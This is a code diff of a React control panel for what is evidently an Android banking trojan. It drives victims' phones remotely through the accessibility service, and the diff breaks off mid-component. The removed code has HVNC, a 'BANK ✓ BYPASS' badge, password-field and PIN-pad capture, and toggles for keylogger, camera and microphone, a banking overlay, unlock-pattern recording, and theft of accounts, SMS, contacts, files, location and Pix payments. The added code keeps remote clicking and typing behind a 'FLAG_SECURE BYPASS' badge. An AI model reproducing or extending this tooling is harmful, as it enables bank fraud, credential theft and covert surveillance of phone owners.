-  const editNodes   = useMemo(() => nodes.filter(n => n.editable && !n.password), [nodes]);
-  const pinNodes    = useMemo(() => nodes.filter(n => n.isPinDigit),         [nodes]);
-  const clickNodes  = useMemo(() => nodes.filter(n => n.clickable && n.text), [nodes]);
+  if (requireClickable) {
+    const clickable = candidates.find(n => n.clickable || n.edit || n.scroll)
+    return clickable || candidates[0] || null
+  }
+  return candidates[0] || null
+}
 
-  // ── Canvas container height ────────────────────────────────────────────────
-  const canvasH = mode === 'DUPLO' ? 340 : (mode === 'EDITAR' ? 200 : 560);
+// ──────────────────────────────────────────────────────────────
+// COMPONENT
+// ──────────────────────────────────────────────────────────────
 
-  // ─────────────────────────────────────────────────────────────────────────────
-  // RENDER
-  // ─────────────────────────────────────────────────────────────────────────────
+const MODES = {
+  click:  { label: 'CLICK',       icon: MousePointer, color: 'text-gold'   },
+  type:   { label: 'TYPE',        icon: Keyboard,     color: 'text-info'   },
+  scroll: { label: 'SCROLL',      icon: Move,         color: 'text-teal'   },
+  info:   { label: 'INFO',        icon: AlignLeft,    color: 'text-textSecondary' },
+}
+
+export default function ScreenReaderV2({ deviceId }) {
+  const sr2Data    = useDeviceStore(s => s.sr2Frames?.[deviceId])
+  const canvasRef  = useRef(null)
+  const rafRef     = useRef(null)
+  const dirtyRef   = useRef(true)
+
+  const [running,    setRunning]    = useState(false)
+  const [fps,        setFps]        = useState(0)
+  const [latency,    setLatency]    = useState(0)
+  const [mode,       setMode]       = useState('click')  // click|type|scroll|info
+  const [hoveredId,  setHoveredId]  = useState(null)
+  const [selectedId, setSelectedId] = useState(null)
+  const [selectedNode, setSelectedNode] = useState(null)
+  const [typeText,   setTypeText]   = useState('')
+  const [showOverlay, setShowOverlay] = useState(true)
+
+  const nodesRef    = useRef([])
+  const swRef       = useRef(1080)
+  const shRef       = useRef(2340)
+  const lastFrame   = useRef(0)
+  const frameCount  = useRef(0)
+  const lastFpsTs   = useRef(Date.now())
+
+  // ── Sync incoming SR2 data ──────────────────────────────────
+  useEffect(() => {
+    if (!sr2Data) return
+    nodesRef.current = sr2Data.nodes || []
+    swRef.current    = sr2Data.sw    || 1080
+    shRef.current    = sr2Data.sh    || 2340
+    dirtyRef.current = true
+
+    // FPS counter
+    frameCount.current++
+    const now = Date.now()
+    const elapsed = (now - lastFpsTs.current) / 1000
+    if (elapsed >= 1) {
+      setFps(Math.round(frameCount.current / elapsed))
+      frameCount.current = 0
+      lastFpsTs.current  = now
+    }
+    setLatency(now - (sr2Data.ts || now))
+  }, [sr2Data])
+
+  // ── RAF render loop ─────────────────────────────────────────
+  useEffect(() => {
+    const loop = () => {
+      rafRef.current = requestAnimationFrame(loop)
+      if (!dirtyRef.current) return
+      dirtyRef.current = false
+      const canvas = canvasRef.current
+      if (!canvas) return
+      const ctx = canvas.getContext('2d')
+      const { width: cw, height: ch } = canvas
+
+      // Background
+      ctx.fillStyle = '#0a0a0a'
+      ctx.fillRect(0, 0, cw, ch)
+
+      if (nodesRef.current.length === 0) {
+        ctx.fillStyle = 'rgba(255,255,255,0.2)'
+        ctx.font = '13px "JetBrains Mono", monospace'
+        ctx.textAlign = 'center'
+        ctx.fillText('Waiting for Screen Reader V2 frame…', cw / 2, ch / 2)
+        ctx.textAlign = 'left'
+        return
+      }
+
+      drawNodes(ctx, nodesRef.current, swRef.current, shRef.current, cw, ch, hoveredId, selectedId)
+
+      // Overlay: package + activity name
+      if (showOverlay && sr2Data) {
+        ctx.fillStyle = 'rgba(0,0,0,0.65)'
+        ctx.fillRect(0, 0, cw, 20)
+        ctx.fillStyle = '#d4a017'
+        ctx.font = '10px "JetBrains Mono", monospace'
+        ctx.fillText(`${sr2Data.pkg || '—'} · ${(sr2Data.activity || '').split('.').pop()}`, 6, 13)
+        ctx.fillStyle = 'rgba(255,255,255,0.4)'
+        ctx.fillText(`${fps} fps · ${latency}ms · ${nodesRef.current.length} nodes`, cw - 140, 13)
+      }
+    }
+    rafRef.current = requestAnimationFrame(loop)
+    return () => cancelAnimationFrame(rafRef.current)
+  }, [hoveredId, selectedId, fps, latency, showOverlay, sr2Data])
+
+  // ── Coord conversion: canvas px → device px ─────────────────
+  const toDevice = useCallback((e) => {
+    const canvas = canvasRef.current
+    if (!canvas) return [0, 0]
+    const rect = canvas.getBoundingClientRect()
+    const sx   = swRef.current / canvas.offsetWidth
+    const sy   = shRef.current / canvas.offsetHeight
+    return [
+      (e.clientX - rect.left) * sx,
+      (e.clientY - rect.top)  * sy,
+    ]
+  }, [])
+
+  // ── Mouse move → hover highlight ────────────────────────────
+  const handleMouseMove = useCallback((e) => {
+    if (!nodesRef.current.length) return
+    const [dx, dy] = toDevice(e)
+    const node = hitTest(nodesRef.current, dx, dy, false)
+    const id = node?.id ?? null
+    if (id !== hoveredId) {
+      setHoveredId(id)
+      dirtyRef.current = true
+    }
+  }, [hoveredId, toDevice])
+
+  // ── Click → ACTION_CLICK via accessibility service ──────────
+  const handleClick = useCallback((e) => {
+    if (!nodesRef.current.length || !deviceId) return
+    const [dx, dy] = toDevice(e)
+
+    if (mode === 'info') {
+      const node = hitTest(nodesRef.current, dx, dy, false)
+      setSelectedId(node?.id ?? null)
+      setSelectedNode(node ?? null)
+      dirtyRef.current = true
+      return
+    }
+
+    if (mode === 'type') {
+      // Focus the editable node
+      const node = hitTest(nodesRef.current, dx, dy, true)
+      if (node?.edit || node?.cls?.toLowerCase().includes('edit')) {
+        setSelectedId(node.id)
+        setSelectedNode(node)
+        ws.sendCommand(deviceId, {
+          action: 'PERFORM_NODE_ACTION',
+          node_id: node.id,
+          action_type: 'FOCUS',
+          bounds: node.b,
+        })
+        dirtyRef.current = true
+      }
+      return
+    }
+
+    if (mode === 'scroll') {
+      // handled by wheel
+      return
+    }
+
+    // Default: CLICK mode
+    const node = hitTest(nodesRef.current, dx, dy, true)
+    if (node) {
+      setSelectedId(node.id)
+      setSelectedNode(node)
+      dirtyRef.current = true
+      ws.sendCommand(deviceId, {
+        action: 'PERFORM_NODE_ACTION',
+        node_id: node.id,
+        action_type: 'CLICK',
+        bounds: node.b,
+      })
+    } else {
+      // Fallback: dispatchGesture tap via accessibility
+      ws.sendCommand(deviceId, C.accessibilityTap(
+        parseFloat((dx / swRef.current).toFixed(4)),
+        parseFloat((dy / shRef.current).toFixed(4)),
+      ))
+    }
+  }, [deviceId, mode, toDevice])
+
+  // ── Mouse wheel → SCROLL_FORWARD/BACKWARD ──────────────────
+  const handleWheel = useCallback((e) => {
+    if (!deviceId) return
+    e.preventDefault()
+    const [dx, dy] = toDevice(e)
+    const node = hitTest(nodesRef.current, dx, dy, false)
+    const scrollableNode = node
+      ? nodesRef.current.find(n => n.scroll && n.b &&
+          dx >= n.b[0] && dx <= n.b[2] && dy >= n.b[1] && dy <= n.b[3])
+      : null
+    ws.sendCommand(deviceId, {
+      action: 'PERFORM_NODE_ACTION',
+      node_id: scrollableNode?.id ?? null,
+      action_type: e.deltaY > 0 ? 'SCROLL_FWD' : 'SCROLL_BWD',
+      bounds: scrollableNode?.b ?? null,
+    })
+  }, [deviceId, toDevice])
+
+  // ── Keyboard → SET_TEXT on selected editable node ──────────
+  const handleKeyDown = useCallback((e) => {
+    if (!deviceId || !selectedNode) return
+    if (e.key === 'Enter') {
+      ws.sendCommand(deviceId, {
+        action: 'PERFORM_NODE_ACTION',
+        node_id: selectedNode.id,
+        action_type: 'CLICK',
+        bounds: selectedNode.b,
+      })
+      return
+    }
+    if (e.key === 'Backspace') {
+      const next = typeText.slice(0, -1)
+      setTypeText(next)
+      ws.sendCommand(deviceId, {
+        action: 'ACCESSIBILITY_SET_TEXT',
+        node_id: selectedNode.id,
+        text: next,
+      })
+      return
+    }
+    if (e.key.length === 1) {
+      const next = typeText + e.key
+      setTypeText(next)
+      ws.sendCommand(deviceId, {
+        action: 'ACCESSIBILITY_SET_TEXT',
+        node_id: selectedNode.id,
+        text: next,
+      })
+    }
+  }, [deviceId, selectedNode, typeText])
+
+  // ── Start / Stop SR2 ────────────────────────────────────────
+  const startSR2 = () => {
+    if (!deviceId) return
+    ws.sendCommand(deviceId, C.startSR2(30))
+    setRunning(true)
+  }
+  const stopSR2 = () => {
+    if (!deviceId) return
+    ws.sendCommand(deviceId, C.stopSR2())
+    setRunning(false)
+  }
+  const snapshot = () => {
+    if (!deviceId) return
+    ws.sendCommand(deviceId, C.sr2Snapshot())
+  }
+
+  // ── Global actions ─────────────────────────────────────────
+  const globalAction = (id) => deviceId && ws.sendCommand(deviceId, C.performGlobalAction(id))
+
   return (
-    <div style={{ paddingBottom: 32, userSelect: 'none' }}>
+    <div className="space-y-2" onKeyDown={handleKeyDown} tabIndex={0} style={{ outline: 'none' }}>
 
-      {/* ── Toast ── */}
-      {toast && (
-        <div style={{
-          position: 'fixed', top: 70, left: '50%', transform: 'translateX(-50%)',
-          background: 'rgba(8,6,2,.97)', border: '1px solid var(--gold)',
-          borderRadius: 12, padding: '9px 18px', zIndex: 9999,
-          maxWidth: '84vw', textAlign: 'center', pointerEvents: 'none',
-          boxShadow: '0 4px 30px rgba(0,0,0,.8)', fontSize: 12, color: '#00c864', fontWeight: 700,
-          animation: 'fadeUp .18s ease',
-        }}>{toast}</div>
-      )}
-
-      {/* ── Header toolbar ── */}
-      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
-        <div style={{ width: 4, height: 40, background: vncOn ? '#00c864' : '#3b7af0', borderRadius: 2, flexShrink: 0 }} />
-        <div>
-          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
-            SCREEN READER V2 ⚡
-          </div>
-          <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginTop: 2 }}>
-            <span style={{ fontSize: 10, color: vncOn ? '#00c864' : 'var(--text3)', fontWeight: 700 }}>
-              {vncOn ? `${activeMode}` : 'OFFLINE'}
-            </span>
-            {fps > 0 && <span style={{ fontSize: 10, color: '#3b7af0', fontWeight: 700 }}>{fps}fps</span>}
-            {hz > 0  && <span style={{ fontSize: 10, color: '#9060ff', fontWeight: 700 }}>{hz}hz</span>}
-            {bankApp && <span style={{ fontSize: 9, padding: '1px 5px', borderRadius: 4, background: 'rgba(255,50,80,.15)', color: '#ff5c80', border: '1px solid rgba(255,50,80,.3)' }}>BANK</span>}
-          </div>
-        </div>
-        <div style={{ marginLeft: 'auto', display: 'flex', gap: 4, flexWrap: 'wrap', justifyContent: 'flex-end' }}>
-          {['HVNC','WIRE','EDITAR','DUPLO'].map(m => (
-            <button key={m} onClick={() => setMode(m)}
-              style={{ padding: '4px 9px', fontSize: 10, fontWeight: 700, borderRadius: 6, border: 'none',
-                cursor: 'pointer', background: mode === m ? '#3b7af0' : 'var(--bg3)',
-                color: mode === m ? '#fff' : 'var(--text2)', transition: 'background .12s' }}>
-              {m}
-            </button>
-          ))}
-          <button onClick={() => { stopAll(); onBack(); }}
-            style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700, borderRadius: 6,
-              border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)', cursor: 'pointer' }}>
-            ←
+      {/* ── Top Controls ─────────────────────────────────── */}
+      <div className="flex items-center gap-2 flex-wrap">
+        {/* Start/Stop */}
+        {!running ? (
+          <button onClick={startSR2} className="btn-gold text-xs flex items-center gap-1.5 py-1.5">
+            <Play size={11} />START SR2
           </button>
+        ) : (
+          <button onClick={stopSR2} className="btn-danger text-xs flex items-center gap-1.5 py-1.5">
+            <Square size={11} />STOP
+          </button>
+        )}
+        <button onClick={snapshot} className="btn-outline text-xs flex items-center gap-1.5 py-1.5">
+          <RefreshCw size={11} />SNAPSHOT
+        </button>
+
+        {/* FPS / latency */}
+        <div className="px-2 py-1.5 rounded-lg bg-surface border border-border font-mono text-xs text-textMuted">
+          {fps} FPS · {latency}ms
+        </div>
+
+        {/* Node count */}
+        {sr2Data && (
+          <div className="px-2 py-1.5 rounded-lg bg-gold/10 border border-gold/20 font-mono text-xs text-gold">
+            {nodesRef.current.length} NODES
+          </div>
+        )}
+
+        <div className="flex-1" />
+
+        {/* Overlay toggle */}
+        <button
+          onClick={() => setShowOverlay(v => !v)}
+          className={clsx('btn-outline text-xs py-1.5', showOverlay && 'border-gold/40 text-gold')}
+        >
+          OVERLAY
+        </button>
+      </div>
+
+      {/* ── Interaction Mode Selector ─────────────────────── */}
+      <div className="flex gap-1">
+        {Object.entries(MODES).map(([key, { label, icon: Icon, color }]) => (
+          <button
+            key={key}
+            onClick={() => setMode(key)}
+            className={clsx(
+              'flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border text-xs font-mono transition-all',
+              mode === key
+                ? `bg-gold/10 border-gold/30 text-gold`
+                : 'border-border text-textMuted hover:border-gold/20 hover:text-textPrimary'
+            )}
+          >
+            <Icon size={11} />{label}
+          </button>
+        ))}
+      </div>
+
+      {/* ── Canvas ──────────────────────────────────────────── */}
+      <div
+        className="relative rounded-xl overflow-hidden border border-border bg-black cursor-crosshair"
+        style={{ aspectRatio: `${swRef.current}/${shRef.current}`, maxHeight: '68vh' }}
+      >
+        <canvas
+          ref={canvasRef}
+          width={swRef.current}
+          height={shRef.current}
+          className="w-full h-full"
+          style={{ imageRendering: 'pixelated', touchAction: 'none' }}
+          onMouseMove={handleMouseMove}
+          onClick={handleClick}
+          onWheel={handleWheel}
+          onMouseLeave={() => { setHoveredId(null); dirtyRef.current = true }}
+        />
+
+        {/* FLAG_SECURE badge */}
+        <div className="absolute top-2 right-2 px-2 py-1 rounded-lg bg-online/10 border border-online/20 text-online text-[10px] font-mono font-bold">
+          ⚡ FLAG_SECURE BYPASS
+        </div>
+
+        {/* Mode indicator overlay */}
+        <div className={clsx(
+          'absolute bottom-2 left-2 px-2 py-1 rounded-lg border text-[10px] font-mono transition-all',
+          mode === 'click'  ? 'bg-gold/10 border-gold/20 text-gold' :
+          mode === 'type'   ? 'bg-info/10 border-info/20 text-info' :
+          mode === 'scroll' ? 'bg-teal/10 border-teal/20 text-teal' :
+          'bg-surface border-border text-textMuted'
+        )}>
+          MODE: {mode.toUpperCase()}
         </div>
       </div>
 
-      {/* ── Start/Stop bar ── */}
-      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 5, marginBottom: 8 }}>
-        <button className="btn btn-green btn-block btn-sm" onClick={startAll}
-          style={{ fontSize: 10, fontWeight: 800 }}>▶ HVNC + SR V2</button>
-        <button className="btn btn-gold btn-block btn-sm" onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('↺ HIERARQUIA'); }}
-          style={{ fontSize: 10 }}>↺ ATUALIZAR</button>
-        <button className="btn btn-red btn-block btn-sm" onClick={stopAll}
-          style={{ fontSize: 10 }}>⏹ PARAR</button>
-      </div>
-
-      {/* ── HVNC Canvas View ── */}
-      {(showHvnc || showWire) && (
-        <div style={{ position: 'relative', marginBottom: 8, borderRadius: 14, overflow: 'hidden',
-          border: `2px solid ${vncOn && fps > 0 ? '#00c864' : wireframe ? '#9060ff' : '#3b7af0'}`,
-          boxShadow: vncOn && fps > 0 ? '0 0 18px rgba(0,200,100,.25)' : '0 0 14px rgba(59,122,240,.2)',
-          background: '#080810', height: canvasH }}>
-
-          {/* VNC JPEG frame (background) */}
-          <canvas ref={vncCanvasRef}
-            style={{ position: 'absolute', inset: 0, width: '100%', height: '100%',
-              objectFit: 'contain', display: showWire ? 'none' : 'block' }}
-            width={VNC_W} height={VNC_H} />
-
-          {/* Wireframe canvas (shows when no VNC) */}
-          {(showWire || wireframe) && (
-            <canvas ref={wfCanvasRef}
-              style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}
-              width={640} height={Math.round(640 * (sh / sw))} />
-          )}
-
-          {/* Node overlay (always on top, captures pointer events) */}
-          <canvas ref={overlayCanvasRef}
-            style={{ position: 'absolute', inset: 0, width: '100%', height: '100%',
-              cursor: hover ? (hover.editable ? 'text' : hover.clickable ? 'pointer' : 'crosshair') : 'crosshair',
-              opacity: showWire ? 0.7 : 0.85 }}
-            width={VNC_W} height={VNC_H}
-            onPointerMove={onPointerMove}
-            onPointerDown={onPointerDown}
-            onPointerUp={onPointerUp}
-            onTouchStart={onTouchStart}
-            onTouchEnd={onTouchEnd}
-          />
-
-          {/* HUD overlay */}
-          <div style={{ position: 'absolute', top: 6, left: 6, display: 'flex', gap: 4, pointerEvents: 'none', zIndex: 2 }}>
-            {vncOn && fps > 0 && (
-              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(0,200,100,.85)', color: '#fff', fontWeight: 800 }}>
-                HVNC {fps}fps
-              </span>
-            )}
-            {wireframe && (
-              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(144,96,255,.85)', color: '#fff', fontWeight: 700 }}>
-                WIREFRAME
-              </span>
-            )}
-            {bankApp && (
-              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(255,50,80,.85)', color: '#fff', fontWeight: 700 }}>
-                BANK ✓ BYPASS
-              </span>
-            )}
-            {srOn && (
-              <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: 'rgba(59,122,240,.85)', color: '#fff', fontWeight: 700 }}>
-                SR {hz}hz
-              </span>
-            )}
-          </div>
-
-          {/* Hover tooltip */}
-          {hover && hover.bounds && (
-            <div style={{ position: 'absolute', bottom: 6, left: 6, right: 6,
-              background: 'rgba(8,6,2,.92)', border: '1px solid var(--gold-border)',
-              borderRadius: 8, padding: '4px 8px', pointerEvents: 'none', zIndex: 3 }}>
-              <div style={{ fontSize: 9, color: 'var(--gold)', fontWeight: 700, marginBottom: 1 }}>
-                {hover.cls.split('.').pop() || '?'}
-                {hover.clickable && <span style={{ color: '#3b7af0' }}> ● CLICK</span>}
-                {hover.editable  && <span style={{ color: '#FFD200' }}> ● EDIT</span>}
-                {hover.password  && <span style={{ color: '#FF2A5A' }}> ● PASS</span>}
-                {hover.scrollable && <span style={{ color: '#00C8FF' }}> ● SCROLL</span>}
-              </div>
-              {hover.text && (
-                <div style={{ fontSize: 10, color: '#b8c0d0', fontFamily: 'monospace' }}>
-                  "{hover.text.slice(0, 60)}"
-                </div>
-              )}
-            </div>
-          )}
-
-          {/* No-stream placeholder */}
-          {!vncOn && !wireframe && nodes.length === 0 && (
-            <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
-              alignItems: 'center', justifyContent: 'center', gap: 10 }}>
-              <div className="spin" style={{ width: 28, height: 28, borderWidth: 3 }} />
-              <div style={{ fontSize: 11, color: 'var(--text3)' }}>Pressione ▶ HVNC + SR V2</div>
-            </div>
-          )}
-        </div>
-      )}
-
-      {/* ── Navigation bar ── */}
-      {(showHvnc || showWire) && (
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 4, marginBottom: 8 }}>
-          {[
-            ['◀', 'BACK'],
-            ['⌂', 'HOME'],
-            ['⧉', 'RECENTS'],
-            ['🔔', 'NOTIFICATIONS'],
-            ['⚡', 'QUICK_SETTINGS'],
-            ['📋', 'CLIPBOARD'],
-          ].map(([icon, action]) => (
-            <button key={action} onClick={() => nav(action)}
-              style={{ padding: '6px 0', fontSize: 14, borderRadius: 8, border: '1px solid var(--gold-border)',
-                background: 'var(--bg3)', color: 'var(--gold)', cursor: 'pointer', fontWeight: 700 }}>
-              {icon}
-            </button>
-          ))}
-        </div>
-      )}
-
-      {/* ── Keyboard capture bar ── */}
-      {(showHvnc || showWire) && (
-        <div style={{ display: 'flex', gap: 6, marginBottom: 8, alignItems: 'center' }}>
-          <button onClick={() => { setKbCapture(p => !p); setTypedBuf(''); }}
-            style={{ padding: '6px 12px', fontSize: 10, fontWeight: 800, borderRadius: 8,
-              border: `1px solid ${kbCapture ? '#00c864' : 'var(--gold-border)'}`,
-              background: kbCapture ? 'rgba(0,200,100,.15)' : 'var(--bg3)',
-              color: kbCapture ? '#00c864' : 'var(--text2)', cursor: 'pointer', flexShrink: 0 }}>
-            ⌨ {kbCapture ? 'ON' : 'OFF'}
-          </button>
-          <div style={{ flex: 1, padding: '5px 10px', borderRadius: 8, background: 'var(--bg2)',
-            border: `1px solid ${kbCapture ? 'rgba(0,200,100,.4)' : 'var(--gold-border)'}`,
-            fontSize: 11, color: kbCapture ? '#00c864' : 'var(--text3)', fontFamily: 'monospace',
-            minHeight: 28, display: 'flex', alignItems: 'center' }}>
-            {typedBuf || (kbCapture ? '▌ capturando...' : 'teclado desativado')}
-          </div>
-          {kbCapture && typedBuf && (
-            <button onClick={() => { sendCmd('TYPE', { text: typedBuf }); showToast(`⌨ SEND: "${typedBuf}"`); setTypedBuf(''); }}
-              style={{ padding: '6px 10px', fontSize: 10, borderRadius: 8, border: 'none',
-                background: '#3b7af0', color: '#fff', cursor: 'pointer', fontWeight: 800 }}>
-              SEND
-            </button>
-          )}
-        </div>
-      )}
-
-      {/* ── Quality / VNC controls ── */}
-      {(showHvnc || showWire) && (
-        <div style={{ display: 'flex', gap: 6, marginBottom: 10, alignItems: 'center' }}>
-          <span style={{ fontSize: 10, color: 'var(--text3)', flexShrink: 0 }}>QUAL</span>
-          <input type="range" min={20} max={100} step={5} value={quality}
-            onChange={e => setQualityAndSend(+e.target.value)}
-            style={{ flex: 1, accentColor: '#3b7af0' }} />
-          <span style={{ fontSize: 10, color: '#3b7af0', fontWeight: 700, width: 28, textAlign: 'right' }}>
-            {quality}
-          </span>
-          <button onClick={startVncOnly} style={{ padding: '4px 8px', fontSize: 9, borderRadius: 6,
-            border: '1px solid #3b7af0', background: 'transparent', color: '#3b7af0', cursor: 'pointer' }}>
-            VNC↺
-          </button>
-          <button onClick={startSrOnly} style={{ padding: '4px 8px', fontSize: 9, borderRadius: 6,
-            border: '1px solid #9060ff', background: 'transparent', color: '#9060ff', cursor: 'pointer' }}>
-            SR↺
-          </button>
-        </div>
-      )}
-
-      {/* ── Quick-action nodes ── */}
-      {(showHvnc || showWire) && nodes.length > 0 && (
-        <div style={{ marginBottom: 10 }}>
-          {/* Password fields */}
-          {pwdNodes.length > 0 && (
-            <div style={{ marginBottom: 6 }}>
-              <div style={{ fontSize: 9, color: '#FF2A5A', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
-                🔑 CAMPOS SENHA ({pwdNodes.length})
-              </div>
-              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
-                {pwdNodes.map((n, i) => (
-                  <button key={i} onClick={() => {
-                    if (n.bounds) {
-                      sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
-                      showToast('🔑 TAP SENHA');
-                    }
-                  }} style={{ padding: '3px 8px', fontSize: 10, borderRadius: 6,
-                    border: '1px solid #FF2A5A', background: 'rgba(255,42,90,.12)',
-                    color: '#FF2A5A', cursor: 'pointer' }}>
-                    {n.hint || n.id?.split('/').pop() || `campo ${i+1}`}
-                  </button>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {/* PIN digits */}
-          {pinNodes.length > 0 && (
-            <div style={{ marginBottom: 6 }}>
-              <div style={{ fontSize: 9, color: '#FF8C00', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
-                🔢 PIN PAD ({pinNodes.length})
-              </div>
-              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
-                {pinNodes.map((n, i) => (
-                  <button key={i} onClick={() => {
-                    if (n.bounds) sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
-                  }} style={{ padding: '3px 10px', fontSize: 12, fontWeight: 800, borderRadius: 6,
-                    border: '1px solid #FF8C00', background: 'rgba(255,140,0,.18)',
-                    color: '#FF8C00', cursor: 'pointer', minWidth: 36, textAlign: 'center' }}>
-                    {n.text}
-                  </button>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {/* Clickable elements */}
-          {clickNodes.length > 0 && clickNodes.length <= 20 && (
-            <div style={{ marginBottom: 6 }}>
-              <div style={{ fontSize: 9, color: '#3b7af0', fontWeight: 800, letterSpacing: 1, marginBottom: 3 }}>
-                ⚡ ELEMENTOS CLICÁVEIS ({clickNodes.length})
-              </div>
-              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
-                {clickNodes.slice(0, 16).map((n, i) => (
-                  <button key={i} onClick={() => {
-                    if (n.bounds) {
-                      sendCmd('TAP', { x: Math.round(n.bounds.x + n.bounds.w/2), y: Math.round(n.bounds.y + n.bounds.h/2) });
-                      showToast(`⚡ TAP → ${n.text}`);
-                    }
-                  }} style={{ padding: '3px 8px', fontSize: 10, borderRadius: 6,
-                    border: '1px solid rgba(59,122,240,.5)', background: 'rgba(59,122,240,.12)',
-                    color: '#90b8ff', cursor: 'pointer', maxWidth: 120, overflow: 'hidden',
-                    textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
-                    {n.text.slice(0, 18)}
-                  </button>
-                ))}
-              </div>
-            </div>
-          )}
-        </div>
-      )}
-
-      {/* ── EDITAR V2 control panel ── */}
-      {showEdit && (
-        <div style={{ marginTop: showHvnc || showWire ? 4 : 0 }}>
-          <SectionHdr icon="⚡" label="CONTROLE AO VIVO" />
-
-          <CtrlBtn label="Informações Gerais"    state={null}              onClick={() => sendCmd('GET_DEVICE_INFO')} />
-          <CtrlBtn label="Tela ao Vivo (HVNC)"  state={bool(d.vnc_active)} onClick={startVncOnly} />
-          <CtrlBtn label="SR V2 Ativo"           state={bool(srOn)}         onClick={() => srOn ? stopAll() : startAll()} />
-          <CtrlBtn label="Câmera ao Vivo"        state={bool(d.camera_active)} onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !d.camera_active })} />
-          <CtrlBtn label="Áudio ao Vivo"         state={bool(d.mic_active)} onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !d.mic_active })} />
-          <CtrlBtn label="Keylogger"             state={bool(d.keylogger_active)} onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !d.keylogger_active })} />
-          <CtrlBtn label="Banking Overlay"       state={bool(d.black_screen_active)} onClick={() => sendCmd(d.black_screen_active ? 'BLACK_SCREEN_OFF' : 'BLACK_SCREEN_ON')} />
-          <CtrlBtn label="Admin & Lock"          state={bool(d.admin_active)} onClick={() => { sendCmd('CHECK_ADMIN_STATUS'); sendCmd('REQUEST_HIERARCHY'); setMode('HVNC'); }} />
-          <CtrlBtn label="Desbloqueio"           state={null}              onClick={() => sendCmd('START_UNLOCK_RECORDING')} />
-
-          <SectionHdr icon="📁" label="EXTRAÇÃO DE DADOS" />
-          <CtrlBtn label="Contas Google"    onClick={() => sendCmd('GET_ACCOUNTS')} />
-          <CtrlBtn label="Gerenciador de Arquivos" onClick={() => sendCmd('FILE_LIST', { path: '/sdcard' })} />
-          <CtrlBtn label="SMS"             onClick={() => sendCmd('GET_SMS')} />
-          <CtrlBtn label="Contatos"        onClick={() => sendCmd('GET_CONTACTS')} />
-          <CtrlBtn label="Aplicativos"     onClick={() => sendCmd('GET_INSTALLED_APPS')} />
-          <CtrlBtn label="Localização GPS" onClick={() => sendCmd('GET_LOCATION')} />
-
-          <SectionHdr icon="💰" label="FINANCEIRO" />
-          <CtrlBtn label="Pix & Captura" onClick={() => { sendCmd('REQUEST_HIERARCHY'); setMode('HVNC'); }} />
-          <CtrlBtn label="Sequências de Desbloqueio" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />
-
-          {/* Battery */}
-          <div style={{ background: 'rgba(30,20,5,.8)', border: '1px solid var(--gold-border)',
-            borderRadius: 10, padding: '8px 14px', marginBottom: 6 }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 4 }}>
-              <span style={{ fontSize: 10, fontWeight: 700, color: 'var(--gold)' }}>ENERGIA</span>
-              <span style={{ marginLeft: 'auto', fontSize: 12, fontWeight: 700,
-                color: (d.battery_level || 0) > 20 ? '#00c864' : '#ff5c80' }}>
-                {d.battery_level || 0}%
-              </span>
-              {d.is_charging && <span style={{ fontSize: 14, color: '#f0b030' }}>⚡</span>}
-            </div>
-            <div style={{ height: 3, background: 'var(--bg3)', borderRadius: 2 }}>
-              <div style={{ height: '100%', borderRadius: 2, transition: 'width .4s',
-                background: (d.battery_level||0) > 20 ? '#00c864' : '#ff5c80',
-                width: `${d.battery_level||0}%` }} />
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* ── Stats row ── */}
-      <div style={{ display: 'flex', gap: 6, marginTop: 4, flexWrap: 'wrap' }}>
+      {/* ── Global Action Bar ─────────────────────────────── */}
+      <div className="card py-2 flex items-center gap-2 flex-wrap">
+        <span className="label">GLOBAL:</span>
         {[
-          [`📱 ${curPkg.split('.').slice(-1)[0] || '—'}`, 'var(--text3)'],
-          [`🌐 ${d.sdk ? 'API '+d.sdk : '—'}`,           '#9060ff'],
-          [`⌂ ${d.model || '—'}`,                        'var(--text3)'],
-          [`📶 ${d.network_type || '—'}`,                '#00C8FF'],
+          { id: 1, label: 'HOME',          icon: Home         },
+          { id: 2, label: 'BACK',          icon: ChevronLeft  },
+          { id: 3, label: 'RECENTS',       icon: List         },
+          { id: 4, label: 'NOTIFICATIONS', icon: Bell         },
+          { id: 5, label: 'QUICK SETTINGS',icon: Settings     },
+        ].map(({ id, label, icon: Icon }) => (
+          <button
+            key={id}
+            onClick={() => globalAction(id)}
+            className="btn-outline text-xs py-1 flex items-center gap-1"
+          >
+            <Icon size={10} />{label}
+          </button>
+        ))}
+      </div>
+
+      {/* ── Type input bar (shown in TYPE mode) ─────────── */}
+      {mode === 'type' && (
+        <div className="card space-y-2">
+          <p className="label">
+            TYPING INTO: <span className="text-info">{selectedNode?.hint || selectedNode?.cls || 'click an editable field first'}</span>
+          </p>
